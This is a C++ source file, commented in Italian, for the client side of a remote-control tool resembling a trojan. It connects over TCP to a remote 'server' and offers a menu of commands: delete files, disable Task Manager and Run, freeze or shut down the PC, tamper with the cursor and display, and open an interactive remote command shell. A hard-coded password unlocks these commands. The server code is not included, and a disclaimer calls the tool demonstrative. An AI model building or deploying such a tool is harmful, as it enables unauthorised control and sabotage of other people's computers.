
// Client/Server 
// author: Blackname23
// mail: grandeandrea@live.it
// msn: grandeandrea@live.it

// questo file è stato fatto per scopo puramente dimostrativo perciò non mi assumo nessuna responsabilità su ciò che può essere causato
// usando questo...

#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>

using namespace std;

string clipboard;

char tx[1024], rx[1024]; // buffer trasmissione e ricezione
char temp[1024]; // buffer temporaneo per ricevere il testo da tastiera
int i,a,c;
int psw=0;
int timeout;

void client(void);
int controlla(int accettati);

int main()
{
     SetConsoleTitle("Client per Server remoto");
     system("CLS");
     client();
}


void client(void)
{
     char addr[512], *addrR;
     unsigned int port = 1000; // le porte hanno un range di valori da 0 a 65535, proprio come una variabile unsigned int
     long j; // temporaney counter
     int connectionTime = 0; // tempo di connessione in ms

     SOCKET sock;
     WSADATA wsadata;
     WSAStartup(MAKEWORD(2,2), &wsadata);
     sock = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );

     u_long nonblock = 1;
     ioctlsocket(sock, FIONBIO, &nonblock); // configurazione non bloccante

     printf("\n\nIndirizzo IP: ");
     fflush(stdin);
     gets(addr);

     printf("\nPremi per connetterti");
     fflush(stdin);
     getch();

     hostent *hstnt = gethostbyname(addr);

     if(hstnt == NULL)
     {
          printf("\n\n%s impossibile da risolvere", addr);
          return;
     }

     sockaddr_in sockaddr;
     sockaddr.sin_family = AF_INET;
     sockaddr.sin_addr = *((struct in_addr *)hstnt->h_addr); // DNS risolto in indirizzo IP (addrR)
     sockaddr.sin_port = htons(port);

     addrR = inet_ntoa(sockaddr.sin_addr);
     printf("\n\n%s risolto in %s", addr, addrR);

     connect(sock, (SOCKADDR*)&sockaddr, sizeof(sockaddr));
     printf("\n\nConnessione");

     i = 0;
     timeout=3000;
     while(send(sock, "", 0, 0) == -1)
     {
          Sleep(150);
          i += 150;
          connectionTime += 150;
          if(i == 150) printf(".");
          if(i == 300) printf(".");
          if(i == 450) printf(".");
          if(i == 600) printf(".");
          if(i == 750) printf(".");
          if(i == 900)
          {
               printf("\b \b\b \b\b \b\b \b\b \b");
               i = 0;
          }
          if(connectionTime == timeout)
          {
               printf("\rConnessione.....");
               printf("\nNon mi sono riuscito a connettere in %dms!!", timeout);
               return;
          }
     }

     printf("\rConnessione.....");
     printf("\n\nConnesso a %s!! \n", addr);
     cout<<"Scrivi i comandi da inviare...\n\n";
     
          
     while(1)
     {
     
               system("cls");
               cout<<"Le scritte all'interno di \"<>\" sono obbligatorie.       "<<"Password: ";
               if (psw) cout<<"Si"<<endl; else cout<<"No"<<endl;
               cout<<"Quelle all'interno di \"[]\" sono facoltative.\n\n";
               cout<<"1) Chiudi server\n";
               cout<<"2) Riavvia server\n";
               cout<<"3) Spegni pc in <secondi> [-c \"<messaggio>\"]\n";
               cout<<"4) Annulla Spegni/Riavvia/Iberna\n";
               cout<<"5) Riavvia pc in <secondi>\n";
               cout<<"6) Iberna pc in <secondi>\n";
               cout<<"7) Elimina files\n";
               cout<<"8) Danni al cursore\n";
               cout<<"9) Impalla pc\n";
               cout<<"10) Chiedi se riavviare\n"; 
               cout<<"11) Svuota Clipboard\n";
               cout<<"12) Display off (si puo' bloccare)\n";
               cout<<"13) Display on (si puo' bloccare)\n";
               cout<<"14) Disabilita Task Manager\n";
               cout<<"15) Abilita Task Manager\n";
               cout<<"16) Disabilita esegui (Run)\n";
               cout<<"17) Abilita esegui (Run)\n";
               cout<<"18) Disattiva tema/sfondo/desktop\n";
               cout<<"19) Messaggio <Scritta> <Titolo> <Tipo> (Error=16,Question=32,Warning=48,Information=64,Si-No=4,Ok-Cancel=1,Riprova-Cancella=5,Si-No-Cancella=3,Bottone-di-default2=256,bottone-di-default3=512,bottone-di-default4=768) (fino a che il messaggio non si chiude resta bloccato il server)\n";
               cout<<"20) Mette nella clipboard <Testo>\n";
               memset(temp, 0, 1024);
               memset(rx, 0, 1024);
               memset(tx, 0, 1024);
               if(kbhit()) // se viene premuto un tasto non stampa ciò che riceve, e invia la frase battuta sulla tastiera
               {
               fgets(temp, 1023, stdin);
               
               for (int qw=0;qw<=1024;qw++){                  //toglie il "\n" dalla fine della 
                   if(temp[qw]=='\0'){ temp[qw-1]='\0';}      //stringa del file da mandare
               }
               if((strcmp(temp, "client.stop") == 0)||(strcmp(temp, "/disconnetti") == 0)){ j = send(sock, "2", 2, 0); break;}
               if((strcmp(temp, "/psw Andrea1996") == 0)||(strcmp(temp, "/password Andrea1996") == 0)) psw=1;
                              
               strcpy(tx, temp);
               if (psw) j = send(sock, tx, strlen(tx), 0);
               else j = send(sock, "", 2, 0);
               
               if (psw) cout<<"Comando mandato"<<endl;
               
               if(j == -1) {
                            break; // se send ritorna -1 allora byebye connessione.....
                            }
               
if((strcmp(temp, "/cmd") == 0)&&(psw==1)){
int whl=1;
while(whl)
{
if(kbhit()) // se viene premuto un tasto non stampa ciò che riceve, e invia la frase battuta sulla tastiera
{
memset(temp, 0, 1024);
memset(tx, 0, 1024);
fgets(temp, 1023, stdin);
if(strcmp(temp, "/disconnetti\n") == 0) whl=0; // se viene digitato "client.stop" la connessione termina
if(strcmp(temp, "exit\n") == 0) whl=0;
temp[strlen(temp)+1] = '\r';
strcpy(tx, temp); // altrimenti invia solo ciò che è stato digitato
j = send(sock, tx, strlen(tx), 0);
if(j == -1) break; // se send ritorna -1 allora byebye connessione.....
}
memset(rx, 0, 1024);
j = recv(sock, rx, 1024, 0);
cout<<rx;
Sleep(1); // un sospiro per la CPU
}}
               
               if (psw) if (strcmp(tx, "1") == 0) exit(1);
               
               }
               else {
                    j = send(sock, "", 1, 0);
                    if (j == -1) break;
                    for (int k=0;k<=500;k++) { if (kbhit()) break; else Sleep(1); }
                    }
               
               j = recv(sock, rx, 1024, 0);
               
               if(j == -1) {
                            int messaggio = MessageBox(NULL,"Connessione persa\nProvare a riconnettersi?","Errore connessione",MB_YESNO|MB_ICONERROR|MB_SYSTEMMODAL);
     
                            switch(messaggio) {
                            case IDYES:
                                 break;
                            case IDNO:
                                     exit(8);
                                     break;
                            default:
                                     exit(8);
                                     break;
                            }}
                         
          Sleep(1); // un sospiro per la CPU
     }

     closesocket(sock);
}
